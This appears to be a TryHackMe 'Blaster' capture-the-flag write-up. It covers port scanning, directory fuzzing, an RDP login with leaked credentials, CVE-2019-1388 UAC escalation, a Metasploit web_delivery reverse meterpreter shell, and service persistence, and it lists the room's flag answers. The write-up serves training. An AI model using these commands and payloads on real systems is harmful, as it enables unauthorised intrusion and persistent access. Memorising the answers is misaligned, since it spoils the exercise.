---
{"dg-publish":true,"permalink":"/write-ups/try-hack-me/blaster/","tags":["CTF","write-up"]}
---

---
![Pasted image 20240920114036.png|400](/img/user/attachments/Pasted%20image%2020240920114036.png)
_This room is a remix of my previous room [Retro](https://tryhackme.com/room/retro) with some complications I added to that room having been removed. For increased difficulty and an exercise in patience, check that room out after this. In addition, this room is the sequel to [Ice](https://tryhackme.com/room/ice). - DarkStar7471_ 
# Active reconnaisance
## Enum ports and services
General Scan [[Notes/Nmap\|Notes/Nmap]]
```shell
sudo nmap 10.10.73.175 -p- -sS -n --open --min-rate 5000 -vvv -Pn
```

```
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 125
3389/tcp open  ms-wbt-server syn-ack ttl 125
```

> [!check]- How many ports are open on our target system?
> 2
## OS
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

---
# Vuln analysis
Focused scan
```shell
sudo nmap 10.10.73.175 -p 80,3389 -sCV -Pn
```
## Port 80
```c
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
```
![Pasted image 20240919190344.png|400](/img/user/attachments/Pasted%20image%2020240919190344.png)

> [!check]- Looks like there's a web server running, what is the title of the page we discover when browsing to it?
> IIS Windows Server

## Port 3389
```c
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-09-19T21:55:26+00:00; +1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2024-09-19T21:55:22+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2024-09-18T21:33:25
|_Not valid after:  2025-03-20T21:33:25
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
---
# Exploitation
## Fuzzing
```shell
wfuzz -c -t 100 --hc=404,403 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u 10.10.73.175/FUZZ
```
![Pasted image 20240919191351.png|500](/img/user/attachments/Pasted%20image%2020240919191351.png)
> [!check]- Interesting, let's see if there's anything else on this web server by fuzzing it. What hidden directory do we discover?
> /retro
## Retro
Checking the Retro page.
![Pasted image 20240919191729.png|500](/img/user/attachments/Pasted%20image%2020240919191729.png)
> [!check]- Navigate to our discovered hidden directory, what potential username do we discover?
> Wade

Check the Ready player one, post
![Pasted image 20240919192240.png|500](/img/user/attachments/Pasted%20image%2020240919192240.png)

> [!check]- Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?
> parzival

## RDP login
To login execute:
```shell
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.73.175 /u:Wade /p:'parzival'
```
 Get the flag
 ![Pasted image 20240919192649.png|200](/img/user/attachments/Pasted%20image%2020240919192649.png)

> [!check]- Log into the machine via Microsoft Remote Desktop (MSRDP) and read user.txt. What are it's contents?
> THM{HACK_PLAYER_ONE}

---
# Privilege Escalation
We find an unusual file 
![Pasted image 20240919194547.png|100](/img/user/attachments/Pasted%20image%2020240919194547.png)
And searching information about CVE with the hint of the room:
![Pasted image 20240919193857.png](/img/user/attachments/Pasted%20image%2020240919193857.png)
> [!check]- When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?
> CVE-2019-1388

From the executable from the desktop above we have the next answer
> [!check]- Looks like an executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well after testing it. What is the name of this executable?
> hhupd

## Exploit CVE-2019-1388
Follow the steps from here.
https://github.com/nobodyatall648/CVE-2019-1388
Like the below pics.
1. find a program that can trigger the UAC prompt screen
   `hhupd`
   And run it as Administrator
2. select "Show more details"
   ![Pasted image 20240919212955.png|300](/img/user/attachments/Pasted%20image%2020240919212955.png)
3. select "Show information about the publisher's certificate"
   ![Pasted image 20240919213028.png|300](/img/user/attachments/Pasted%20image%2020240919213028.png)
4. click on the "Issued by" URL link it will prompt a browser interface.
   ![Pasted image 20240919213103.png|300](/img/user/attachments/Pasted%20image%2020240919213103.png)
   And close the two windows
5. wait for the site to be fully loaded & select "save as" to prompt a explorer window for "save as".
   ![Pasted image 20240919213232.png|300](/img/user/attachments/Pasted%20image%2020240919213232.png)
6. on the explorer window address path, enter the cmd.exe full path:
   `C:\WINDOWS\system32\cmd.exe`
   ![Pasted image 20240919213413.png|400](/img/user/attachments/Pasted%20image%2020240919213413.png)
7. now you'll have an escalated privileges command prompt. 
![Pasted image 20240919213447.png|400](/img/user/attachments/Pasted%20image%2020240919213447.png)
> [!check]- Now that we've spawned a terminal, let's go ahead and run the command 'whoami'. What is the output of running this?
> nt authority\system

And get the flag
![Pasted image 20240919213805.png](/img/user/attachments/Pasted%20image%2020240919213805.png)
> [!check]- Now that we've confirmed that we have an elevated prompt, read the contents of `root.txt` on the Administrator's desktop. What are the contents? Keep your terminal up after exploitation so we can use it in task four!
> THM{COIN_OPERATED_EXPLOITATION}
# Gain remote shell
Select exploit
```shell
use exploit/multi/script/web_delivery
```

Show info
```shell
info
```
![Pasted image 20240920083419.png|300](/img/user/attachments/Pasted%20image%2020240920083419.png)

> [!check]- First, let's set the target to PSH (PowerShell). Which target number is PSH?
> 2

And select the PSH with the number
```shell
set target PSH
```

Set payload
```shell
set payload windows/meterpreter/reverse_http
```

Set the `lport`and `lhost`
E.g. 
```shell
setg lhost 10.6.2.59
setg lport 4747
```

All ready
![Pasted image 20240920084139.png|400](/img/user/attachments/Pasted%20image%2020240920084139.png)
After all, `run -j`
And we have a code
![Pasted image 20240920092816.png|300](/img/user/attachments/Pasted%20image%2020240920092816.png)
Copy, paste and run on the windows machine.
After run it, we come back to the [[Metasploit\|metasploit]] and we have a shell
![Pasted image 20240920094759.png|600](/img/user/attachments/Pasted%20image%2020240920094759.png)
# Persistence
Use the session number obtained in the last step.
Use the module and configs
```shell
use exploit/windows/local/persistence_service
```
![Pasted image 20240920103609.png|700](/img/user/attachments/Pasted%20image%2020240920103609.png)
Run `expoloit`
![Pasted image 20240920103644.png|700](/img/user/attachments/Pasted%20image%2020240920103644.png)
**Or** use the module
```shell
use exploit/windows/local/persistence_service
```
![Pasted image 20240920104008.png|700](/img/user/attachments/Pasted%20image%2020240920104008.png)
And `exploit`
![Pasted image 20240920104042.png|700](/img/user/attachments/Pasted%20image%2020240920104042.png)
The next time that the system reboots we have to start a listener with the handler and the revershell will send to us automatically.

To answer the question we have to search info from internet because the scripts on meterpreter are deprecated and we don't have info to find the answer.

> [!check]- Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup.
> run persistence -X




---